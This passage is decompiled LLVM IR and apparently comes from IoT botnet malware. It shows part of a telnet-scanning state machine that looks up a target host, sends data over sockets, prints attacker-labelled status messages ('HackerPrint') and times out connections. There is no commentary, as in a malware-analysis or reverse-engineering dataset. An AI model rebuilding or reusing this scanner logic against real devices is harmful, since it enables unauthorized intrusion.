  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c8ac, label %dec_label_pc_805ca2d, label %dec_label_pc_805c8b4

dec_label_pc_805c8b4:                             ; preds = %dec_label_pc_805c887
  %v3_805c8ca = add i32 %v2_805ba9b, %v2_805baec
  %v4_805c8ca = inttoptr i32 %v3_805c8ca to i8*
  %v5_805c8ca = load i8, i8* %v4_805c8ca, align 1
  %v10_805c8cf = icmp eq i8 %v5_805c8ca, 2
  %v1_805c8d1 = icmp eq i1 %v10_805c8cf, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805c8d1, label %dec_label_pc_805c8f3, label %dec_label_pc_805c8d3

dec_label_pc_805c8d3:                             ; preds = %dec_label_pc_805c8b4
  store i8 7, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805c8f3:                             ; preds = %dec_label_pc_805c8b4
  %v3_805c909 = add i32 %v2_805bc60, %v2_805baec
  %v4_805c909 = inttoptr i32 %v3_805c909 to i8*
  %v5_805c909 = load i8, i8* %v4_805c909, align 1
  %v6_805c909 = zext i8 %v5_805c909 to i32
  store i32 %v6_805c909, i32* %eax.global-to-local, align 4
  %v1_805c911 = mul nuw nsw i32 %v6_805c909, 4
  %v2_805c911 = add nuw nsw i32 %v1_805c911, 134682708
  %v3_805c911 = inttoptr i32 %v2_805c911 to i32*
  %v4_805c911 = load i32, i32* %v3_805c911, align 4
  store i32 %v4_805c911, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805c92e = add i32 %v2_805bc9b, %v2_805baec
  %v4_805c92e = inttoptr i32 %v3_805c92e to i8*
  %v5_805c92e = load i8, i8* %v4_805c92e, align 2
  %v6_805c92e = zext i8 %v5_805c92e to i32
  store i32 %v6_805c92e, i32* %eax.global-to-local, align 4
  %v1_805c936 = mul nuw nsw i32 %v6_805c92e, 4
  %v2_805c936 = add nuw nsw i32 %v1_805c936, 134682696
  %v3_805c936 = inttoptr i32 %v2_805c936 to i32*
  %v4_805c936 = load i32, i32* %v3_805c936, align 4
  store i32 %v4_805c936, i32* @esi, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baee, i32* %eax.global-to-local, align 4
  %v1_805c956 = load i32, i32* @esp, align 4
  %v2_805c956 = inttoptr i32 %v1_805c956 to i32*
  store i32 %v2_805baee, i32* %v2_805c956, align 4
  %v0_805c959 = call i32 @get_telstate_host()
  store i32 %v0_805c959, i32* %eax.global-to-local, align 4
  %v0_805c95e = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805c95e = ptrtoint i8* %v0_805c95e to i32
  store i32 %v1_805c95e, i32* %edx.global-to-local, align 4
  %v0_805c964 = load i32, i32* @ebx, align 4
  %v1_805c964 = load i32, i32* @esp, align 4
  %v2_805c964 = add i32 %v1_805c964, 16
  %v3_805c964 = inttoptr i32 %v2_805c964 to i32*
  store i32 %v0_805c964, i32* %v3_805c964, align 4
  %v0_805c968 = load i32, i32* @esi, align 4
  %v1_805c968 = load i32, i32* @esp, align 4
  %v2_805c968 = add i32 %v1_805c968, 12
  %v3_805c968 = inttoptr i32 %v2_805c968 to i32*
  store i32 %v0_805c968, i32* %v3_805c968, align 4
  %v1_805c96c = load i32, i32* @esp, align 4
  %v2_805c96c = add i32 %v1_805c96c, 8
  %v3_805c96c = inttoptr i32 %v2_805c96c to i32*
  store i32 %v0_805c959, i32* %v3_805c96c, align 4
  %v0_805c970 = load i32, i32* @esp, align 4
  %v1_805c970 = add i32 %v0_805c970, 4
  %v2_805c970 = inttoptr i32 %v1_805c970 to i32*
  store i32 ptrtoint (i32* @global_var_806cb40.1326 to i32), i32* %v2_805c970, align 4
  %v0_805c978 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c978 = load i32, i32* @esp, align 4
  %v2_805c978 = inttoptr i32 %v1_805c978 to i32*
  store i32 %v0_805c978, i32* %v2_805c978, align 4
  %v0_805c97b = load i8*, i8** %stack_var_-336, align 4
  %v1_805c97b = ptrtoint i8* %v0_805c97b to i32
  %v2_805c97b = load i32, i32* %stack_var_-332, align 4
  %v3_805c97b = call i32 @HackerPrint(i32 %v1_805c97b, i32 %v2_805c97b)
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v5_805c996 = load i8, i8* %v4_805c909, align 1
  %v6_805c996 = zext i8 %v5_805c996 to i32
  store i32 %v6_805c996, i32* %eax.global-to-local, align 4
  %v1_805c99e = mul nuw nsw i32 %v6_805c996, 4
  %v2_805c99e = add nuw nsw i32 %v1_805c99e, 134682708
  %v3_805c99e = inttoptr i32 %v2_805c99e to i32*
  %v4_805c99e = load i32, i32* %v3_805c99e, align 4
  store i32 %v4_805c99e, i32* @ebx, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v5_805c9bb = load i8, i8* %v4_805c92e, align 2
  %v6_805c9bb = zext i8 %v5_805c9bb to i32
  store i32 %v6_805c9bb, i32* %eax.global-to-local, align 4
  %v1_805c9c3 = mul nuw nsw i32 %v6_805c9bb, 4
  %v2_805c9c3 = add nuw nsw i32 %v1_805c9c3, 134682696
  %v3_805c9c3 = inttoptr i32 %v2_805c9c3 to i32*
  %v4_805c9c3 = load i32, i32* %v3_805c9c3, align 4
  store i32 %v4_805c9c3, i32* @esi, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baee, i32* %eax.global-to-local, align 4
  %v1_805c9e3 = load i32, i32* @esp, align 4
  %v2_805c9e3 = inttoptr i32 %v1_805c9e3 to i32*
  store i32 %v2_805baee, i32* %v2_805c9e3, align 4
  %v0_805c9e6 = call i32 @get_telstate_host()
  store i32 %v0_805c9e6, i32* %eax.global-to-local, align 4
  %v0_805c9eb = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805c9eb = ptrtoint i8* %v0_805c9eb to i32
  store i32 %v1_805c9eb, i32* %edx.global-to-local, align 4
  %v0_805c9f1 = load i32, i32* @ebx, align 4
  %v1_805c9f1 = load i32, i32* @esp, align 4
  %v2_805c9f1 = add i32 %v1_805c9f1, 16
  %v3_805c9f1 = inttoptr i32 %v2_805c9f1 to i32*
  store i32 %v0_805c9f1, i32* %v3_805c9f1, align 4
  %v0_805c9f5 = load i32, i32* @esi, align 4
  %v1_805c9f5 = load i32, i32* @esp, align 4
  %v2_805c9f5 = add i32 %v1_805c9f5, 12
  %v3_805c9f5 = inttoptr i32 %v2_805c9f5 to i32*
  store i32 %v0_805c9f5, i32* %v3_805c9f5, align 4
  %v1_805c9f9 = load i32, i32* @esp, align 4
  %v2_805c9f9 = add i32 %v1_805c9f9, 8
  %v3_805c9f9 = inttoptr i32 %v2_805c9f9 to i32*
  store i32 %v0_805c9e6, i32* %v3_805c9f9, align 4
  %v0_805c9fd = load i32, i32* @esp, align 4
  %v1_805c9fd = add i32 %v0_805c9fd, 4
  %v2_805c9fd = inttoptr i32 %v1_805c9fd to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_806cbac.1327 to i32), i32* %v2_805c9fd, align 4
  %v0_805ca05 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ca05 = load i32, i32* @esp, align 4
  %v2_805ca05 = inttoptr i32 %v1_805ca05 to i32*
  store i32 %v0_805ca05, i32* %v2_805ca05, align 4
  %v0_805ca08 = load i8*, i8** %stack_var_-336, align 4
  %v1_805ca08 = ptrtoint i8* %v0_805ca08 to i32
  %v2_805ca08 = load i32, i32* %stack_var_-332, align 4
  %v3_805ca08 = call i32 @HackerPrint(i32 %v1_805ca08, i32 %v2_805ca08)
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_805bb3c, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805ca2d:                             ; preds = %dec_label_pc_805c887
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805ca5e = add i32 %v2_805ba9b, %v2_805baec
  %v4_805ca5e = inttoptr i32 %v3_805ca5e to i8*
  store i8 1, i8* %v4_805ca5e, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805ca68:                             ; preds = %dec_label_pc_805c7b0
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v2_805ca83 = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805ca83, i32* %eax.global-to-local, align 4
  %v1_805ca85 = add i32 %v2_805ca83, 7
  store i32 %v1_805ca85, i32* @ebx, align 4
  %v0_805ca88 = load i32, i32* @esp, align 4
  %v1_805ca88 = inttoptr i32 %v0_805ca88 to i32*
  store i32 0, i32* %v1_805ca88, align 4
  %v0_805ca8f = load i8*, i8** %stack_var_-336, align 4
  %tmp37 = bitcast i8* %v0_805ca8f to i32*
  %v3_805ca8f = call i32 @__GI_time(i32* %tmp37)
  store i32 %v3_805ca8f, i32* %eax.global-to-local, align 4
  %v0_805ca94 = load i32, i32* @ebx, align 4
  %v7_805ca94 = icmp ult i32 %v0_805ca94, %v3_805ca8f
  %v1_805ca96 = icmp eq i1 %v7_805ca94, false
  br i1 %v1_805ca96, label %dec_label_pc_805cc2b, label %dec_label_pc_805ca9c

dec_label_pc_805ca9c:                             ; preds = %dec_label_pc_805ca68
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805cacd = add i32 %v2_805ba9b, %v2_805baec
  %v4_805cacd = inttoptr i32 %v3_805cacd to i8*
  store i8 1, i8* %v4_805cacd, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805cad7:                             ; preds = %dec_label_pc_805bb26
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_805cada = load i32, i32* @esp, align 4
  %v1_805cada = inttoptr i32 %v0_805cada to i32*
  store i32 0, i32* %v1_805cada, align 4
  %tmp38 = inttoptr i32 %v6_805bb3c to i32*
  %v3_805cae1 = call i32 @__GI_time(i32* %tmp38)
  %v0_805caeb = load i32, i32* @ebx, align 4
  %v1_805caed = mul i32 %v0_805caeb, 4
  store i32 %v1_805caed, i32* %edx.global-to-local, align 4
  %v2_805cafb = mul i32 %v0_805caeb, 28
  %v2_805cafd = add i32 %v2_805cafb, %v2_805ba15
  %v1_805caff = add i32 %v2_805cafd, 16
  %v2_805cb02 = inttoptr i32 %v1_805caff to i32*
  store i32 %v3_805cae1, i32* %v2_805cb02, align 4
  %v0_805cb04 = load i32, i32* bitcast ([324 x i8]** @global_var_8071860.1329 to i32*), align 32
  store i32 %v0_805cb04, i32* %eax.global-to-local, align 4
  %v1_805cb09 = load i32, i32* @esp, align 4
  %v2_805cb09 = inttoptr i32 %v1_805cb09 to i32*
  store i32 %v0_805cb04, i32* %v2_805cb09, align 4
  %v0_805cb0c = load i8*, i8** %stack_var_-336, align 4
  %v3_805cb0c = call i32 @strlen(i8* %v0_805cb0c)
  store i32 %v3_805cb0c, i32* @ebx, align 4
  %v0_805cb13 = load i32, i32* bitcast ([324 x i8]** @global_var_8071860.1329 to i32*), align 32
  store i32 %v0_805cb13, i32* @esi, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805cb2f = inttoptr i32 %v2_805baee to i32*
  %v4_805cb2f = load i32, i32* %v3_805cb2f, align 4
  store i32 %v4_805cb2f, i32* %eax.global-to-local, align 4
  %v0_805cb32 = load i32, i32* @esp, align 4
  %v1_805cb32 = add i32 %v0_805cb32, 12
  %v2_805cb32 = inttoptr i32 %v1_805cb32 to i32*
  store i32 16384, i32* %v2_805cb32, align 4
  %v0_805cb3a = load i32, i32* @ebx, align 4
  %v1_805cb3a = load i32, i32* @esp, align 4
  %v2_805cb3a = add i32 %v1_805cb3a, 8
  %v3_805cb3a = inttoptr i32 %v2_805cb3a to i32*
  store i32 %v0_805cb3a, i32* %v3_805cb3a, align 4
  %v0_805cb3e = load i32, i32* @esi, align 4
  %v1_805cb3e = load i32, i32* @esp, align 4
  %v2_805cb3e = add i32 %v1_805cb3e, 4
  %v3_805cb3e = inttoptr i32 %v2_805cb3e to i32*
  store i32 %v0_805cb3e, i32* %v3_805cb3e, align 4
  %v0_805cb42 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cb42 = load i32, i32* @esp, align 4
  %v2_805cb42 = inttoptr i32 %v1_805cb42 to i32*
  store i32 %v0_805cb42, i32* %v2_805cb42, align 4
  %v0_805cb45 = load i8*, i8** %stack_var_-336, align 4
  %v1_805cb45 = ptrtoint i8* %v0_805cb45 to i32
  %v2_805cb45 = load i32, i32* %stack_var_-332, align 4
  %v3_805cb45 = load i32, i32* %stack_var_-328, align 4
  %v5_805cb45 = call i32 @__libc_send(i32 %v1_805cb45, i32 %v2_805cb45, i32 %v3_805cb45, i32 %stack_var_-324.242)
  %v2_805cb4a = icmp slt i32 %v5_805cb45, 0
  %v1_805cb4c = icmp eq i1 %v2_805cb4a, false
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  br i1 %v1_805cb4c, label %dec_label_pc_805cbaa, label %dec_label_pc_805cb4e

dec_label_pc_805cb4e:                             ; preds = %dec_label_pc_805cad7
  %v4_805cb64 = load i32, i32* %v3_805cb2f, align 4
  store i32 %v4_805cb64, i32* %eax.global-to-local, align 4
  %v1_805cb67 = load i32, i32* @esp, align 4
  %v2_805cb67 = inttoptr i32 %v1_805cb67 to i32*
  store i32 %v4_805cb64, i32* %v2_805cb67, align 4
  %v0_805cb6a = load i8*, i8** %stack_var_-336, align 4
  %v1_805cb6a = ptrtoint i8* %v0_805cb6a to i32
  %v2_805cb6a = call i32 @sclose(i32 %v1_805cb6a)
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  %v3_805cba0 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805cba0 = inttoptr i32 %v3_805cba0 to i8*
  store i8 1, i8* %v4_805cba0, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805cbaa:                             ; preds = %dec_label_pc_805cad7
  %v3_805cbc0 = add i32 %v2_805ba9b, %v2_805baec
  %v4_805cbc0 = inttoptr i32 %v3_805cbc0 to i8*
  store i8 3, i8* %v4_805cbc0, align 1
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v1_805baf0, i32* %eax.global-to-local, align 4
  %v2_805cbe0 = load i32, i32* %v1_805baf3, align 4
  store i32 %v2_805cbe0, i32* %eax.global-to-local, align 4
  %v1_805cbe2 = add i32 %v2_805cbe0, 60
  store i32 %v1_805cbe2, i32* @ebx, align 4
  %v0_805cbe5 = load i32, i32* @esp, align 4
  %v1_805cbe5 = inttoptr i32 %v0_805cbe5 to i32*
  store i32 0, i32* %v1_805cbe5, align 4
  %v0_805cbec = load i8*, i8** %stack_var_-336, align 4
  %tmp39 = bitcast i8* %v0_805cbec to i32*
  %v3_805cbec = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_805cbec, i32* %eax.global-to-local, align 4
  %v0_805cbf1 = load i32, i32* @ebx, align 4
  %v7_805cbf1 = icmp ult i32 %v0_805cbf1, %v3_805cbec
  %v1_805cbf3 = icmp eq i1 %v7_805cbf1, false
  br i1 %v1_805cbf3, label %dec_label_pc_805cc2b, label %dec_label_pc_805cbf5

dec_label_pc_805cbf5:                             ; preds = %dec_label_pc_805cbaa
  store i8 0, i8* %v4_805bb3c, align 4
  store i32 %v1_805bade, i32* %edx.global-to-local, align 4
  store i32 %v2_805baec, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_805cbc0, align 1
  br label %dec_label_pc_805cc2b

dec_label_pc_805cc2b:                             ; preds = %dec_label_pc_805bb26, %dec_label_pc_805cbaa, %dec_label_pc_805ca68, %dec_label_pc_805c5e5, %dec_label_pc_805c354, %dec_label_pc_805c1fe, %dec_label_pc_805bd3c, %dec_label_pc_805cb4e, %dec_label_pc_805ca9c, %dec_label_pc_805ca2d, %dec_label_pc_805c8f3, %dec_label_pc_805c8d3, %dec_label_pc_805c867, %dec_label_pc_805c790, %dec_label_pc_805c755, %dec_label_pc_805c6dd, %dec_label_pc_805c619, %dec_label_pc_805c5c5, %dec_label_pc_805c5a5, %dec_label_pc_805c4ff, %dec_label_pc_805c4c4, %dec_label_pc_805c44c, %dec_label_pc_805c388, %dec_label_pc_805c334, %dec_label_pc_805c314, %dec_label_pc_805c232, %dec_label_pc_805c1a2, %dec_label_pc_805c0a2, %dec_label_pc_805c046, %dec_label_pc_805bedf, %dec_label_pc_805be9e, %dec_label_pc_805bd1c, %dec_label_pc_805bcdd, %dec_label_pc_805cbf5
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.241, %dec_label_pc_805bb26 ], [ %stack_var_-24.241, %dec_label_pc_805cbaa ], [ %stack_var_-24.241, %dec_label_pc_805cbf5 ], [ %stack_var_-24.241, %dec_label_pc_805cb4e ], [ %stack_var_-24.241, %dec_label_pc_805ca68 ], [ %stack_var_-24.241, %dec_label_pc_805ca9c ], [ %stack_var_-24.241, %dec_label_pc_805ca2d ], [ %stack_var_-24.241, %dec_label_pc_805c8f3 ], [ %stack_var_-24.241, %dec_label_pc_805c8d3 ], [ %stack_var_-24.241, %dec_label_pc_805c867 ], [ %stack_var_-24.241, %dec_label_pc_805c790 ], [ %stack_var_-24.241, %dec_label_pc_805c755 ], [ %stack_var_-24.241, %dec_label_pc_805c6dd ], [ %stack_var_-24.241, %dec_label_pc_805c5e5 ], [ %stack_var_-24.241, %dec_label_pc_805c619 ], [ %stack_var_-24.241, %dec_label_pc_805c5c5 ], [ %stack_var_-24.241, %dec_label_pc_805c5a5 ], [ %stack_var_-24.241, %dec_label_pc_805c4ff ], [ %stack_var_-24.241, %dec_label_pc_805c4c4 ], [ %stack_var_-24.241, %dec_label_pc_805c44c ], [ %stack_var_-24.241, %dec_label_pc_805c354 ], [ %stack_var_-24.241, %dec_label_pc_805c388 ], [ %stack_var_-24.241, %dec_label_pc_805c334 ], [ %stack_var_-24.241, %dec_label_pc_805c314 ], [ %v6_805bf31, %dec_label_pc_805c1fe ], [ %v6_805bf31, %dec_label_pc_805c232 ], [ %v6_805bf31, %dec_label_pc_805c1a2 ], [ %v6_805bf31, %dec_label_pc_805c0a2 ], [ %v6_805bf31, %dec_label_pc_805c046 ], [ %stack_var_-24.241, %dec_label_pc_805bd3c ], [ %stack_var_-24.241, %dec_label_pc_805bedf ], [ %stack_var_-24.241, %dec_label_pc_805be9e ], [ %stack_var_-24.241, %dec_label_pc_805bd1c ], [ %stack_var_-24.241, %dec_label_pc_805bcdd ]
  %stack_var_-324.1 = phi i32 [ %stack_var_-324.242, %dec_label_pc_805bb26 ], [ %stack_var_-324.242, %dec_label_pc_805cbaa ], [ %stack_var_-324.242, %dec_label_pc_805cbf5 ], [ %stack_var_-324.242, %dec_label_pc_805cb4e ], [ %stack_var_-324.242, %dec_label_pc_805ca68 ], [ %stack_var_-324.242, %dec_label_pc_805ca9c ], [ %stack_var_-324.242, %dec_label_pc_805ca2d ], [ %stack_var_-324.242, %dec_label_pc_805c8f3 ], [ %stack_var_-324.242, %dec_label_pc_805c8d3 ], [ %stack_var_-324.242, %dec_label_pc_805c867 ], [ %stack_var_-324.242, %dec_label_pc_805c790 ], [ %stack_var_-324.242, %dec_label_pc_805c755 ], [ %stack_var_-324.242, %dec_label_pc_805c6dd ], [ %stack_var_-324.242, %dec_label_pc_805c5e5 ], [ %stack_var_-324.242, %dec_label_pc_805c619 ], [ %stack_var_-324.242, %dec_label_pc_805c5c5 ], [ %stack_var_-324.242, %dec_label_pc_805c5a5 ], [ %stack_var_-324.242, %dec_label_pc_805c4ff ], [ %stack_var_-324.242, %dec_label_pc_805c4c4 ], [ %stack_var_-324.242, %dec_label_pc_805c44c ], [ %stack_var_-324.242, %dec_label_pc_805c354 ], [ %stack_var_-324.242, %dec_label_pc_805c388 ], [ %stack_var_-324.242, %dec_label_pc_805c334 ], [ %stack_var_-324.242, %dec_label_pc_805c314 ], [ 10, %dec_label_pc_805c1fe ], [ 10, %dec_label_pc_805c232 ], [ 10, %dec_label_pc_805c1a2 ], [ 10, %dec_label_pc_805c0a2 ], [ 10, %dec_label_pc_805c046 ], [ %stack_var_-324.242, %dec_label_pc_805bd3c ], [ %stack_var_-324.242, %dec_label_pc_805bedf ], [ %stack_var_-324.242, %dec_label_pc_805be9e ], [ %stack_var_-324.242, %dec_label_pc_805bd1c ], [ %stack_var_-324.242, %dec_label_pc_805bcdd ]
  %stack_var_-604.1 = phi i32 [ %stack_var_-604.243, %dec_label_pc_805bb26 ], [ %stack_var_-604.243, %dec_label_pc_805cbaa ], [ %stack_var_-604.243, %dec_label_pc_805cbf5 ], [ %stack_var_-604.243, %dec_label_pc_805cb4e ], [ %stack_var_-604.243, %dec_label_pc_805ca68 ], [ %stack_var_-604.243, %dec_label_pc_805ca9c ], [ %stack_var_-604.243, %dec_label_pc_805ca2d ], [ %stack_var_-604.243, %dec_label_pc_805c8f3 ], [ %stack_var_-604.243, %dec_label_pc_805c8d3 ], [ %stack_var_-604.243, %dec_label_pc_805c867 ], [ %stack_var_-604.243, %dec_label_pc_805c790 ], [ %stack_var_-604.243, %dec_label_pc_805c755 ], [ %stack_var_-604.243, %dec_label_pc_805c6dd ], [ %stack_var_-604.243, %dec_label_pc_805c5e5 ], [ %stack_var_-604.243, %dec_label_pc_805c619 ], [ %stack_var_-604.243, %dec_label_pc_805c5c5 ], [ %stack_var_-604.243, %dec_label_pc_805c5a5 ], [ %stack_var_-604.243, %dec_label_pc_805c4ff ], [ %stack_var_-604.243, %dec_label_pc_805c4c4 ], [ %stack_var_-604.243, %dec_label_pc_805c44c ], [ %stack_var_-604.243, %dec_label_pc_805c354 ], [ %stack_var_-604.243, %dec_label_pc_805c388 ], [ %stack_var_-604.243, %dec_label_pc_805c334 ], [ %stack_var_-604.243, %dec_label_pc_805c314 ], [ %stack_var_-604.243, %dec_label_pc_805c1fe ], [ %stack_var_-604.243, %dec_label_pc_805c232 ], [ %stack_var_-604.243, %dec_label_pc_805c1a2 ], [ %stack_var_-604.243, %dec_label_pc_805c0a2 ], [ %stack_var_-604.243, %dec_label_pc_805c046 ], [ %v2_805bd94, %dec_label_pc_805bd3c ], [ %v2_805bd94, %dec_label_pc_805bedf ], [ %v2_805bd94, %dec_label_pc_805be9e ], [ %stack_var_-604.243, %dec_label_pc_805bd1c ], [ %stack_var_-604.243, %dec_label_pc_805bcdd ]
  %v4_805cc2b = add nuw nsw i32 %storemerge44, 1
  %v15_805cc32 = icmp eq i32 %v4_805cc2b, 1000
  br i1 %v15_805cc32, label %dec_label_pc_805bacc, label %dec_label_pc_805bad8

; uselistorder directives
  uselistorder i32 %v4_805cc2b, { 1, 0, 2 }
  uselistorder i32 %v13_805c0d5, { 1, 0 }
  uselistorder i32 %v0_805c0bb, { 1, 0 }
  uselistorder i32 %v5_805bfd1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805bf70, { 1, 0 }
  uselistorder i32 %v2_805bf54, { 1, 0 }
  uselistorder i32 %v12_805be2a, { 1, 0 }
  uselistorder i32 %v2_805bd94, { 0, 3, 7, 1, 2, 4, 5, 6, 8, 9 }
  uselistorder i32 %v2_805bba4, { 0, 2, 1 }
  uselistorder i8* %v5_805bb44, { 2, 1, 0 }
  uselistorder i32 %v6_805bb3c, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i8* %v4_805bb3c, { 22, 23, 17, 18, 19, 20, 21, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_805baf3, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_805baf0, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_805baee, { 21, 16, 15, 18, 17, 19, 20, 14, 11, 12, 13, 10, 7, 8, 9, 4, 5, 6, 0, 1, 2, 3, 22 }
  uselistorder i32 %v2_805baec, { 24, 0, 1, 23, 25, 26, 2, 35, 3, 32, 27, 28, 29, 5, 30, 4, 31, 6, 33, 34, 36, 7, 38, 39, 8, 37, 40, 41, 42, 9, 43, 10, 45, 44, 46, 11, 48, 49, 12, 47, 50, 51, 52, 13, 53, 14, 55, 54, 56, 15, 63, 64, 16, 62, 65, 58, 59, 17, 57, 60, 61, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 78, 18, 79, 80, 20, 81, 21, 82, 22 }
  uselistorder i32 %v1_805bade, { 1, 2, 0, 3, 4, 16, 17, 12, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 40, 39, 41, 42, 43, 51, 52, 50, 53, 45, 46, 47, 44, 48, 49, 54, 55, 56, 60, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 57, 71, 72, 73, 74 }
  uselistorder i32 %stack_var_-24.241, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 29 }
  uselistorder i32 %stack_var_-324.242, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 19, 18, 17, 16, 15, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1, 12, 11, 21, 20 }
  uselistorder i32 %stack_var_-604.243, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31 }
  uselistorder i32 %storemerge44, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_805bac0, { 1, 0, 2 }
  uselistorder i32 %storemerge346, { 3, 2, 0, 1 }
  uselistorder i32 %v2_805ba9b, { 1, 0, 4, 3, 2, 6, 5, 7, 9, 8, 10, 13, 12, 11, 14, 15 }
  uselistorder i32 %v2_805ba15, { 4, 5, 6, 7, 8, 12, 0, 1, 2, 9, 3, 10, 11 }
  uselistorder i32* %stack_var_-608, { 0, 3, 1, 2, 5, 4 }
  uselistorder i32* %stack_var_-600, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-320, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-328, { 0, 1, 4, 3, 2, 6, 9, 8, 5, 7, 10, 11 }
  uselistorder i32* %stack_var_-332, { 0, 7, 8, 1, 4, 3, 2, 6, 10, 9, 5, 11, 12 }
  uselistorder i8** %stack_var_-336, { 14, 9, 22, 16, 13, 6, 5, 12, 21, 18, 11, 19, 20, 10, 7, 15, 3, 4, 8, 2, 17, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 12, 13, 11, 14, 15, 17, 18, 16, 19, 20, 9, 21, 22, 23, 24, 26, 25, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 59, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 81, 85, 86, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %eax.global-to-local, { 1, 4, 2, 3, 6, 7, 5, 8, 9, 10, 11, 12, 15, 13, 14, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 17, 31, 32, 33, 34, 35, 37, 36, 38, 39, 41, 40, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 57, 55, 56, 59, 60, 61, 58, 62, 63, 64, 66, 65, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 80, 81, 84, 85, 86, 83, 87, 88, 89, 90, 91, 92, 95, 93, 94, 97, 98, 96, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 111, 113, 112, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 127, 125, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 148, 149, 150, 151, 152, 147, 153, 154, 155, 156, 157, 158, 159, 0, 162, 160, 161, 171, 163, 164, 166, 165, 168, 167, 170, 169 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 ()* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 2, 0 }
  uselistorder i32 5000, { 1, 0 }
